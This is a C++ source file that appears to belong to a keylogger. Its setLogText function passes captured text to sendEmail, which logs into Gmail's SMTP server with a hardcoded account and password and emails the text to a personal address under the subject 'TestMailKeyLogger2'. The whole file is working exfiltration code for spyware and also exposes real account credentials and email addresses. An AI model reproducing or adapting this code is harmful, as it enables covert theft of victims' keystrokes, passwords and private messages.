#include "CSmtp.h"
#include <iostream>
#include "myheader.h"
#include<string>

char* strr;

void createMail::setLogText(char* s){
	cout << "setLogText called";
	strr = s;
	sendEmail();
}

int createMail::sendEmail()
{
	cout << "Email Called" ;
	bool bError = false;

	try
	{
		CSmtp mail;

#define test_gmail_tls

#if defined(test_gmail_tls)
		mail.SetSMTPServer("smtp.gmail.com",587);
		mail.SetSecurityType(USE_TLS);
#elif defined(test_gmail_ssl)
		mail.SetSMTPServer("smtp.gmail.com",465);
		mail.SetSecurityType(USE_SSL);
#elif defined(test_hotmail_TLS)
		mail.SetSMTPServer("smtp.live.com",25);
		mail.SetSecurityType(USE_TLS);
#elif defined(test_aol_tls)
		mail.SetSMTPServer("smtp.aol.com",587);
		mail.SetSecurityType(USE_TLS);
#elif defined(test_yahoo_ssl)
		mail.SetSMTPServer("plus.smtp.mail.yahoo.com",465);
		mail.SetSecurityType(USE_SSL);
#endif

		mail.SetLogin("keylogger4556@gmail.com");
		mail.SetPassword("key@logger");
  		mail.SetSenderName("User");
  		mail.SetSenderMail("keylogger4556@gmail.com");
  		mail.SetReplyTo("karan07.nagpal@gmail.com");
  		mail.SetSubject("TestMailKeyLogger2");
  		mail.AddRecipient("karan07.nagpal@gmail.com");
  		mail.SetXPriority(XPRIORITY_NORMAL);
  		mail.SetXMailer("The Bat! (v3.02) Professional");
  		mail.AddMsgLine(strr);
		//mail.AddMsgLine("");
		//mail.AddMsgLine("...");
		//mail.AddMsgLine("How are you today?");
		//mail.AddMsgLine("");
		//mail.AddMsgLine("Regards");
		//mail.ModMsgLine(5,"regards");
		//mail.DelMsgLine(2);
		//mail.AddMsgLine("User");

  		//mail.AddAttachment("../test1.jpg");
  		//mail.AddAttachment("c:\\test2.exe");
		//mail.AddAttachment("c:\\test3.txt");
		mail.Send();
	}
	catch(ECSmtp e)
	{
		std::cout << "Error: " << e.GetErrorText().c_str() << ".\n";
		bError = true;
	}
	if(!bError)
		std::cout << "Mail was send successfully.\n";
	return 0;
}
